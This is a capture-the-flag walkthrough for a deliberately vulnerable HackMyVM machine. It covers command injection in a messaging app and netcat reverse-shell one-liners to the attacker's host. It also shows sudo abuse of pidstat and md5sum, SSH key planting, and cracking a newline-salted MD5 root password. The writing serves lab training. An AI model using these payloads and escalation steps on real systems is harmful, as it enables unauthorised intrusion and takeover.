
| Name     | Difficulty | OS    | Target IP     | Link                                                 |
| -------- | ---------- | ----- | ------------- | ---------------------------------------------------- |
| WMessage | Easy       | Linux | 192.168.0.121 | https://hackmyvm.eu/machines/machine.php?vm=WMessage |

### ARP Scan

```bash
garffff@garffff:~/hackmyvm/wmessage$ sudo arp-scan -l | grep 90
[sudo] password for garffff:            
192.168.0.121	08:00:27:14:fa:90	PCS Systemtechnik GmbH
```

### Nmap Scan

```bash
garffff@garffff:~/hackmyvm/wmessage$ sudo nmap -p- -sV -sC 192.168.0.121 -oA nmap/wmessage.tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-10 20:55 BST
Nmap scan report for 192.168.0.121
Host is up (0.000053s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
| http-title: Login
|_Requested resource was /login?next=%2F
MAC Address: 08:00:27:14:FA:90 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.09 seconds
```

### Viewing Port 80

Viewing port 80 we see a login for and an option is register:

![[Pasted image 20240810205704.png]]

Registering to the site:

![[Pasted image 20240810205742.png]]

Once logged in we see a message:

![[Pasted image 20240810205805.png]]

This message pretty much tells us what to do:

```bash
- Master: Hi, This is finally working. I spent a month on this messaging system I hope there are no bugs in it. use !mpstat to get the status of the server.
```

Using the `!mpstat`:

![[Pasted image 20240810212323.png]]

We get the following output:

![[Pasted image 20240810212358.png]]

Issueing the `!mpstat;whoami`: 

![[Pasted image 20240810212428.png]]

Refreshing the page we can see our current user::

![[Pasted image 20240810212453.png]]

### Reverse Shell

Using msfvenom, I created a netcat payload:

```bash
garffff@garffff:~/hackmyvm/wmessage$ sudo msfvenom -p cmd/unix/reverse_netcat lhost=192.168.0.51 lport=443
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 97 bytes
mkfifo /tmp/htbuxv; nc 192.168.0.51 443 0</tmp/htbuxv | /bin/sh >/tmp/htbuxv 2>&1; rm /tmp/htbuxv
```

And used it with the `!mpstat` command:

![[Pasted image 20240810212613.png]]

This gave me a reverse shell connection:

```bash
garffff@garffff:~/hackmyvm/wmessage$ sudo nc -lvp 443
Listening on 0.0.0.0 443
Connection received on 192.168.0.65 37298
whoami && id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrading the shell:

```bash
whereis python3
python3: /usr/bin/python3.9-config /usr/bin/python3 /usr/bin/python3.9 /usr/lib/python3 /usr/lib/python3.9 /etc/python3 /etc/python3.9 /usr/local/lib/python3.9 /usr/include/python3.9 /usr/share/python3 /usr/share/man/man1/python3.1.gz
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@MSG:/$ ^Z
[1]+  Stopped                 sudo nc -lvp 443
garffff@garffff:~/hackmyvm/wmessage$ stty raw -echo
sudo nc -lvp 443hackmyvm/wmessage$ 


www-data@MSG:/$ whoami && id
whoami && id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@MSG:/$ 
```

### Privilege Escalation - Messagemaster

We can see two users in the `/home` directory:

```bash
www-data@MSG:/$ ls -lash /home
ls -lash /home
total 16K
4.0K drwxr-xr-x  4 root          root          4.0K Nov 21  2022 .
4.0K drwxr-xr-x 18 root          root          4.0K Nov 12  2022 ..
4.0K drwxr-xr-x  3 WM            WM            4.0K Nov 29  2022 WM
4.0K drwxr-xr-x  3 messagemaster messagemaster 4.0K Nov 22  2022 messagemaster
```

issue the `sudo -l` command, we see that we can run the `pidstat` command as the `messagemaster` user:

```bash
www-data@MSG:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on MSG:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on MSG:
    (messagemaster) NOPASSWD: /bin/pidstat
```


GTFObins has a method on how to use this command: https://gtfobins.github.io/gtfobins/pidstat/:

![[Pasted image 20240810212924.png]]

I created another netcat reverse shell payload:

```bash
garffff@garffff:~/hackmyvm/wmessage$ sudo msfvenom -p cmd/unix/reverse_netcat lhost=192.168.0.51 lport=4444
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 98 bytes
mkfifo /tmp/wmbogd; nc 192.168.0.51 4444 0</tmp/wmbogd | /bin/sh >/tmp/wmbogd 2>&1; rm /tmp/wmbogd
```

I created a simple script in the `/tmp` directory:

```bash
www-data@MSG:/$ cd /tmp
cd /tmp
www-data@MSG:/tmp$ echo 'mkfifo /tmp/wmbogd; nc 192.168.0.51 4444 0</tmp/wmbogd | /bin/sh >/tmp/wmbogd 2>&1; rm /tmp/wmbogd' > shell.sh
```

And made it executable:

```bash
www-data@MSG:/tmp$ chmod +x ./shell.sh
```

I will execute `pidstat` as the `messagemaster` user and point the `-e` flag to my script:

```bash
www-data@MSG:/tmp$ sudo -u messagemaster /bin/pidstat -e ./shell.sh
sudo -u messagemaster /bin/pidstat -e ./shell.sh
Linux 5.10.0-19-amd64 (MSG) 	08/11/24 	_x86_64_	(1 CPU)

13:27:50      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
13:27:50     1000       778    0.00    0.00    0.00    0.00    0.00     0  pidstat
www-data@MSG:/tmp$ 
```

This gave me a reverse shell as the `messagemaster` user:

```bash
garffff@garffff:~/hackmyvm/wmessage$ sudo nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.0.65 34704
whoami && id
messagemaster
uid=1000(messagemaster) gid=1000(messagemaster) groups=1000(messagemaster),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth)

```

Upgrading the shell again:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
messagemaster@MSG:/tmp$ ^Z
[1]+  Stopped                 sudo nc -lvp 4444
garffff@garffff:~/hackmyvm/wmessage$ stty raw -echo
sudo nc -lvp 4444ackmyvm/wmessage$ 


messagemaster@MSG:/tmp$ whoami && id
whoami && id
messagemaster
uid=1000(messagemaster) gid=1000(messagemaster) groups=1000(messagemaster),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth)
messagemaster@MSG:/tmp$ 
```

And obtaining the first flag:

```bash
messagemaster@MSG:/tmp$ cd /home/messagemaster
cd /home/messagemaster
messagemaster@MSG:~$ ls -lash
ls -lash
total 28K
4.0K drwxr-xr-x 3 messagemaster messagemaster 4.0K Nov 22  2022 .
4.0K drwxr-xr-x 4 root          root          4.0K Nov 21  2022 ..
   0 -rw------- 1 messagemaster messagemaster    0 Nov 22  2022 .bash_history
4.0K -rw-r--r-- 1 messagemaster messagemaster  220 Nov 12  2022 .bash_logout
4.0K -rw-r--r-- 1 messagemaster messagemaster 3.5K Nov 12  2022 .bashrc
4.0K drwxr-xr-x 3 messagemaster messagemaster 4.0K Nov 22  2022 .local
4.0K -rw-r--r-- 1 messagemaster messagemaster  807 Nov 12  2022 .profile
4.0K -rw------- 1 messagemaster messagemaster   33 Nov 22  2022 User.txt
messagemaster@MSG:~$ cat User.txt
cat User.txt
ea86091a17126fe48a83c1b8d13d60ab

```

### Privilege Escalation - Root:

Looking at `sudo -l` again, we see that we can using the `md5sum` command as root:

```bash
messagemaster@MSG:~$ sudo -l
sudo -l
Matching Defaults entries for messagemaster on MSG:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User messagemaster may run the following commands on MSG:
    (ALL) NOPASSWD: /bin/md5sum
```

I decided to get a better shell. Noticing that `SSH` was open from the initial nmap scans, I created a new private/public key pair:

```bash
messagemaster@MSG:~$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/messagemaster/.ssh/id_rsa): 

Created directory '/home/messagemaster/.ssh'.
Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/messagemaster/.ssh/id_rsa
Your public key has been saved in /home/messagemaster/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:MaawWSaY79g0ggkN49/b7st8zaGkQDTJRzTuWDvVqlQ messagemaster@MSG
The key's randomart image is:
+---[RSA 3072]----+
|o   . ++         |
|.+ o =... .      |
|..+ + =o+E .     |
|.o...O+o+o.      |
|o ..Bo.=S.       |
|   * o+ o. .     |
|  . o..oo + .    |
|      +. o o     |
|      .*o        |
+----[SHA256]--
```

I then copied the public key to the `authoirized_key` file:

```bash
messagemaster@MSG:~/.ssh$  cp id_rsa.pub authorized_keys
```

I took the private key, and used it on my own system:

```bash
messagemaster@MSG:~/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA1DH9Z2kP6bmx2hf8CzFr3e+t32kiaRUHvwx+rgZQKpV0340Q/eHm
W168Dt0pzpiic3mANdTdSq8/NmfVQFYQ2pMc4VPPc8GdWVGBPwcp78tCmfe9R4q+mQZiHY
rUTN/S6uPFZFYylVxkIPWvlzE8VmHjwX5+7Mg6v+q0YbqK956NV2BZr72VwyqWXjloVtp7
tdue9hbsRep17y4svvC+kKhKSlZR3jD9BgpM9HAsVy+yApx6UVDknxklqUDkM7OGhk7VcH
<--snipt-->
-----END OPENSSH PRIVATE KEY-----
```

I can now `ssh` into the box as the `messagemaster` user:

```bash
garffff@garffff:~/hackmyvm/wmessage$ vi id_rsa
garffff@garffff:~/hackmyvm/wmessage$ chmod 600 id_rsa 
garffff@garffff:~/hackmyvm/wmessage$ ssh -i id_rsa messagemaster@192.168.0.211
Linux MSG 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Check /var/Secr

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Tue Nov 22 12:58:24 2022 from 192.168.1.17
messagemaster@MSG:~$
```

### Privilege Escalation - Root:

Issuing the `sudo -l` command again, we see that we can use the `/bin/md5su` as root:

```bash
messagemaster@MSG:/var/www$ sudo -l
Matching Defaults entries for messagemaster on MSG:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User messagemaster may run the following commands on MSG:
    (ALL) NOPASSWD: /bin/md5sum

```

Looking inside the `/var/www` directory, we see a file called `ROOTPASS`:

```bash
messagemaster@MSG:/var/www$ ls -lash
total 16K
4.0K drwxr-xr-x  3 root     root     4.0K Nov 21  2022 .
4.0K drwxr-xr-x 12 root     root     4.0K Nov 20  2022 ..
4.0K drwxrwxr--  5 www-data www-data 4.0K Nov 18  2022 html
4.0K -rw-r-----  1 root     root       12 Nov 21  2022 ROOTPASS
```

Using the `/bin/md5sum` with `sudo` we get the MD5 hash of the file:

```bash
messagemaster@MSG:/var/www$ sudo /bin/md5sum /var/www/ROOTPASS
85c73111b30f9ede8504bb4a4b682f48  /var/www/ROOTPASS
```

Hashcat was unable to crack this:

```bash
garffff@garffff:~/hackmyvm/wmessage$ hashcat -m 0 hash.txt /opt/rockyou.txt 
hashcat (v6.2.6-707-g91095845b) starting

Successfully initialized the NVIDIA main driver CUDA runtime library.

Failed to initialize NVIDIA RTC library.

* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.
             CUDA SDK Toolkit required for proper device support and utilization.
             For more information, see: https://hashcat.net/faq/wrongdriver
             Falling back to OpenCL runtime.

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL API (OpenCL 3.0 CUDA 12.2.148) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: NVIDIA GeForce GTX 1080 Ti, 10176/11164 MB (2791 MB allocatable), 28MCU

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
=====================================================================================================================================
* Device #2: pthread-Intel(R) Core(TM) i7-7700K CPU @ 4.20GHz, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 491 MB

Dictionary cache built:
* Filename..: /opt/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: 85c73111b30f9ede8504bb4a4b682f48
Time.Started.....: Sun Aug 11 14:42:00 2024 (1 sec)
Time.Estimated...: Sun Aug 11 14:42:01 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 18751.5 kH/s (3.96ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 089793 -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Temp: 62c Fan: 28% Util: 34% Core:1923MHz Mem:5005MHz Bus:16
```

So there is an issue here. Hashcat does not recognise what the hash is.  This is because of the new line character used `\n`. 

Looking at the `od -c` on command on `rockyou.txt`, we see in the output new line character`\n`:

```bash
garffff@garffff:~/python/hashlib$ od -c /opt/rockyou.txt | more
0000000   1   2   3   4   5   6  \n   1   2   3   4   5  \n   1   2   3
0000020   4   5   6   7   8   9  \n   p   a   s   s   w   o   r   d  \n
0000040   i   l   o   v   e   y   o   u  \n   p   r   i   n   c   e   s
0000060   s  \n   1   2   3   4   5   6   7  \n   r   o   c   k   y   o
0000100   u  \n   1   2   3   4   5   6   7   8  \n   a   b   c   1   2
0000120   3  \n   n   i   c   o   l   e  \n   d   a   n   i   e   l  \n
```

Hashcat would ignore the new line character `\n`, and would calculate the the MD5 hash without it, which makes sense. In our case, we want to calculate the MD5 hash with the `\n`.

I created a python script to crack the hash that uses the new line character:

```python
import hashlib

target_hash = "85c73111b30f9ede8504bb4a4b682f48"

with open("/opt/rockyou.txt", "r", encoding='utf-8', errors='ignore') as file:
	
	for line in file:
		word = line.strip()
		hash_password = hashlib.md5((word + "\n").encode('utf-8')).hexdigest()
			if hash_password == target_hash:
				print(f"Password is: {word}")
				break
			else:
			print("Password not found")
```

Running the script we get a match:

```bash
garffff@garffff:~/hackmyvm/wmessage$ python3 crack.py 
Message5687
```

Now I can `su` into root with the password found:

```bash
messagemaster@MSG:/var/www$ su root
Password: 
root@MSG:/var/www# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
root@MSG:/var/www# cd /root
root@MSG:~# ls -lash
total 28K
4.0K drwx------  4 root root 4.0K Nov 22  2022 .
4.0K drwxr-xr-x 18 root root 4.0K Nov 12  2022 ..
   0 -rw-------  1 root root    0 Nov 29  2022 .bash_history
4.0K -rw-r--r--  1 root root  571 Apr 11  2021 .bashrc
4.0K drwxr-xr-x  3 root root 4.0K Nov 18  2022 .cache
4.0K drwxr-xr-x  3 root root 4.0K Nov 17  2022 .local
4.0K -rw-r--r--  1 root root  161 Jul  9  2019 .profile
4.0K -rw-r-----  1 root root   33 Nov 22  2022 Root.txt
root@MSG:~# cat Root.txt 
a59b23da18102898b854f3034f8b8b0f
```

### Notes

Below is a POC that illustrates the different hashes when the `\n` is in use.  The second hash matches the hash I was trying to crack:

```bash
garffff@garffff:~/python/hashlib$ cat create_hash.py 
import hashlib

h1 = hashlib.md5()
h2 = hashlib.md5()

h1.update(b"Message5687")

h2.update(b"Message5687\n")

print(h1.hexdigest())

print(h2.hexdigest())

garffff@garffff:~/python/hashlib$ python3 create_hash.py 
3cbe3d2beeda07e4dfa1263bf8992168
85c73111b30f9ede8504bb4a4b682f48
```

Using Hashcat on the string `3cbe3d2beeda07e4dfa1263bf8992168`, it finds a match:

```bash
garffff@garffff:~/hackmyvm/wmessage$ echo '3cbe3d2beeda07e4dfa1263bf8992168' > hash_test.txt
garffff@garffff:~/hackmyvm/wmessage$ hashcat -m 0 hash_test.txt /opt/rockyou.txt 
hashcat (v6.2.6-707-g91095845b) starting

Successfully initialized the NVIDIA main driver CUDA runtime library.

Failed to initialize NVIDIA RTC library.

* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.
             CUDA SDK Toolkit required for proper device support and utilization.
             For more information, see: https://hashcat.net/faq/wrongdriver
             Falling back to OpenCL runtime.

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL API (OpenCL 3.0 CUDA 12.2.148) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: NVIDIA GeForce GTX 1080 Ti, 10112/11164 MB (2791 MB allocatable), 28MCU

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
=====================================================================================================================================
* Device #2: pthread-Intel(R) Core(TM) i7-7700K CPU @ 4.20GHz, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 491 MB

Dictionary cache built:
* Filename..: /opt/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 0 secs

3cbe3d2beeda07e4dfa1263bf8992168:Message5687 
```